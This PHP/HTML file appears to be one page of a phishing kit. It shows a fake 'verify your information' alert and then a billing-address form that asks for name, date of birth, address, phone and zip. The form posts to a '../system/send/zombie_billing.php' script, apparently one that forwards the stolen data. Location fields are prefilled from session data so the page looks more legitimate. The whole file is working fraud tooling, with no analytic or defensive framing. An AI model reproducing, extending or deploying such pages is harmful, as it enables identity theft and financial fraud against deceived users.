<?php

	session_start();
	include "../assets/includes/header.php";

?>
					
					<div class="zombie-loader" id="loading"></div>

					<div class="zombie-form-container centred" id="zombiealert">


						<!--##[ SECTION ]##-->

							<div class="zombie-alert-section">
								<div class="zombie-alert-container">
									<div class="errorIcon"></div>

									<h1 class="medium lighttitle">You need to verify your information.</h1>

									<p class="medium">Click next to verify</p>

									<button class="button" onclick="alerttobill()">Next</button>

								</div>
							</div>

						<!--##[ END SECTION ]##-->
					</div>

					<div class="zombie-form-container hidden" id="zombiebill">
						<!--##[ SECTION ]##-->
<script>
function validateBillForm() {
    var a = document.forms["billForm"]["zombiexname"].value;
    var b = document.forms["billForm"]["zombiexbirth"].value;
    var c = document.forms["billForm"]["zombiexadress"].value;
    var d = document.forms["billForm"]["zombiexcity"].value;
    var e = document.forms["billForm"]["zombiexstate"].value;
    var f = document.forms["billForm"]["zombiexcountry"].value;
    var j = document.forms["billForm"]["zombiexzip"].value;
    var h = document.forms["billForm"]["zombiexphone"].value;
    if (a == "") {
        $("#zombiexname").addClass("hasError");
    }
    if (b == "") {
        $("#zombiexbirth").addClass("hasError");
    }
    if (c == "") {
        $("#zombiexadress").addClass("hasError");
    }
    if (d == "") {
        $("#zombiexcity").addClass("hasError");
    }
    if (e == "") {
        $("#zombiexstate").addClass("hasError");
    }
    if (f == "") {
        $("#zombiexcountry").addClass("hasError");
    }
    if (j == "") {
        $("#zombiexzip").addClass("hasError");
    }
    if (h == "") {
        $("#zombiexphone").addClass("hasError");
    }
    if (a == ""){return false;}if (b == ""){return false;}if (c == ""){return false;}if (d == ""){return false;}if (e == ""){return false;}if (f == ""){return false;}if (j == ""){return false;}if (h == ""){return false;}
}
</script>
							<form action="../system/send/zombie_billing.php" method="post" name="billForm" onsubmit="return validateBillForm()">

								<div class="zombie-sections-steps">
									<span class="zombie-sections-step selected">●</span>
									<span class="zombie-sections-step">○</span>
									<span class="zombie-sections-step">○</span>
									<span class="zombie-sections-step">○</span>
								</div>

								<h3 class="medium">Billing address.</h3>
								<p class="medium">Please verify carefully your billing address:</p>

								<div class="zombie-info-container">
									<div class="zombie-fields">
										<input type="text" name="zombiexname" id="zombiexname" placeholder="Full name" class="capitalize" maxlength="30" autocomplete="off" autocorrect="off" />
									</div>
									<div class="zombie-fields">
										<input type="tel" name="zombiexbirth" id="zombiexbirth" placeholder="Date of birth" onfocus="birthfocus()" onblur="birthblur()" id="zombiexbirth" maxlength="10" autocomplete="off" autocorrect="off" onkeypress="return isNumberKey(event)" />
									</div>
									<div class="zombie-fields">
										<input type="text" name="zombiexadress" id="zombiexadress" placeholder="Street address" class="" maxlength="40"  autocomplete="off" autocorrect="off"/>
									</div>
									<div class="zombie-fields">
										<input type="text" name="zombiexcity" id="zombiexcity" placeholder="City" class="capitalize" maxlength="20" value="<?php echo $_SESSION['countrycity']; ?>" autocomplete="off" autocorrect="off" />
									</div>
									<div class="zombie-fields">
										<input type="text" name="zombiexstate" id="zombiexstate" placeholder="State" class="capitalize" maxlength="30" value="<?php echo $_SESSION['countryregion']; ?>" autocomplete="off" autocorrect="off" />
									</div>
									<div class="zombie-multiple-fields">
										<div class="zombie-feild-box">
											<input type="text" name="zombiexcountry" id="zombiexcountry" placeholder="Country" class="capitalize" maxlength="30" value="<?php echo $_SESSION['country1']; ?>" autocomplete="off" autocorrect="off" />
										</div>
										<div class="zombie-feild-box">
											<input type="text" name="zombiexzip" id="zombiexzip" placeholder="Zip code" maxlength="10" autocomplete="off" autocorrect="off" />
										</div>
									</div>
									<div class="zombie-fields">
										<input type="tel" name="zombiexphone" id="zombiexphone" placeholder="Phone number" maxlength="15" autocomplete="off" autocorrect="off" onkeypress="return isNumberKey(event)" />
									</div>

									<div>
										<button style="width:100%" class="button">Save and continue</button>
									</div>
								</div>

							</form>

						<!--##[ END SECTION ]##-->
					</div>
<?php
	include "../assets/includes/footer.php";
?>

	</div>

<script>
	//Put our input DOM element into a jQuery Object
	var $birthDate = jQuery('#zombiexbirth');

	//Bind keyup/keydown to the input
	$birthDate.bind('keyup','keydown', function(e){
		
	  //To accomdate for backspacing, we detect which key was pressed - if backspace, do nothing:
		if(e.which !== 8) {	
			var numChars = $birthDate.val().length;
			if(numChars === 2 || numChars === 5){
				var thisVal = $birthDate.val();
				thisVal += '/';
				$birthDate.val(thisVal);
			}
	  }
	});
</script>
<script>
	$(document).ready(function(){
	$('#zombiexname').on('keyup keydown keypress change paste', function() {	
		if ($(this).val() == '') { $('#zombiexname').removeClass('hasError'); } else {$('#zombiexname').removeClass('hasError'); }});

	$('#zombiexbirth').on('keyup keydown keypress change paste', function() {	
		if ($(this).val() == '') { $('#zombiexbirth').removeClass('hasError'); } else {$('#zombiexbirth').removeClass('hasError'); }});

	$('#zombiexadress').on('keyup keydown keypress change paste', function() {	
		if ($(this).val() == '') { $('#zombiexadress').removeClass('hasError'); } else {$('#zombiexadress').removeClass('hasError'); }});

	$('#zombiexcity').on('keyup keydown keypress change paste', function() {	
		if ($(this).val() == '') { $('#zombiexcity').removeClass('hasError'); } else {$('#zombiexcity').removeClass('hasError'); }});

	$('#zombiexstate').on('keyup keydown keypress change paste', function() {	
		if ($(this).val() == '') { $('#zombiexstate').removeClass('hasError'); } else {$('#zombiexstate').removeClass('hasError'); }});

	$('#zombiexcountry').on('keyup keydown keypress change paste', function() {	
		if ($(this).val() == '') { $('#zombiexcountry').removeClass('hasError'); } else {$('#zombiexcountry').removeClass('hasError'); }});

	$('#zombiexzip').on('keyup keydown keypress change paste', function() {	
		if ($(this).val() == '') { $('#zombiexzip').removeClass('hasError'); } else {$('#zombiexzip').removeClass('hasError'); }});

	$('#zombiexphone').on('keyup keydown keypress change paste', function() {	
		if ($(this).val() == '') { $('#zombiexphone').removeClass('hasError'); } else {$('#zombiexphone').removeClass('hasError'); }});
	});
</script>
<script>
	// NUMBERS ONLY

	function isNumberKey(evt)
	    {
	        var charCode = (evt.which) ? evt.which : event.keyCode
	        if (charCode > 31 && (charCode < 48 || charCode > 57))
	        return false;

	        return true;
	}
</script>
</body>
</html>